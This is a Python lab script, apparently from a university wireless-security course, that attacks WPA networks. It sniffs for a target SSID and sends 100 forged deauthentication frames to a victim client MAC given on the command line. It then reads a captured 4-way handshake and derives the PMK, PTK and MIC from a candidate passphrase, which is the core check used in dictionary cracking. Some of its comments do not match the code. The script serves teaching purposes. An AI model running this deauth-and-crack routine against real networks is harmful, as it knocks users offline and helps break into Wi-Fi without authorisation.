#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex
from numpy import array_split
from numpy import array
import hmac, hashlib

# Permet de filtrer les paquetes sniffées et lister les réseaux enregistrées auxquelles les clients tentents de se connecter
# Paramètre : paquet sniffé qui doit être filtré
# Remarque : On filtre les paquets par type (0 et 2 - probe request)

def deauth(nbrTime, APmacArg):
	packet = RadioTap()/Dot11(type=0,subtype=12,addr1=victimMAC,addr2=APmacArg,addr3=APmacArg)/Dot11Deauth(reason=7)
	for n in range(nbrTime):
		sendp(packet)
		print 'Deauth sent via: ' + interface + ' to BSSID: ' + APmacArg + ' for Client: ' + victimMAC

def pkt_callback(pkt):
	if pkt.type == 0 and pkt.subtype == 8:
		if pkt.info == ssidToHack:
			APmac = pkt.addr2
			print "AP MAC: %s" %(pkt.addr2)
			deauth(100, APmac)
			return True


interface = sys.argv[1]
ssidToHack = sys.argv[2]
victimMAC = sys.argv[3]

# Sniff le réseau en fct l'interface et filtres les paquets
sniff(iface=interface, stop_filter=pkt_callback)

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function


ssid        = wpa[0].info
APmac       = a2b_hex(wpa[0].addr2.replace(":",""))
Clientmac   = a2b_hex(wpa[1].addr1.replace(":",""))
ANonce      = (wpa[5].load)[13:45]
SNonce      = (wpa[6].load)[13:45]

mic_to_test = "36eef66540fa801ceee2fea9b7929b40"

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée

print "\n\nValues used to derivate keys"
print "============================"
print "Passphrase: ",passPhrase,"\n"
print "SSID: ",ssid,"\n"
print "AP Mac: ",b2a_hex(APmac),"\n"
print "CLient Mac: ",b2a_hex(Clientmac),"\n"
print "AP Nonce: ",b2a_hex(ANonce),"\n"
print "Client Nonce: ",b2a_hex(SNonce),"\n"


def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = ''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)

#expand pmk to obtain PTK
ptk = customPRF512(a2b_hex(pmk),A,B)

#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
mic = hmac.new(ptk[0:16],data,hashlib.sha1)


print "\nResults of the key expansion"
print "============================="
print "PMK:\t\t",pmk,"\n"
print "PTK:\t\t",b2a_hex(ptk),"\n"
print "KCK:\t\t",b2a_hex(ptk[0:16]),"\n"
print "KEK:\t\t",b2a_hex(ptk[16:32]),"\n"
print "TK:\t\t",b2a_hex(ptk[32:48]),"\n"
print "MICK:\t\t",b2a_hex(ptk[48:64]),"\n"
print "MIC:\t\t",mic.hexdigest(),"\n"
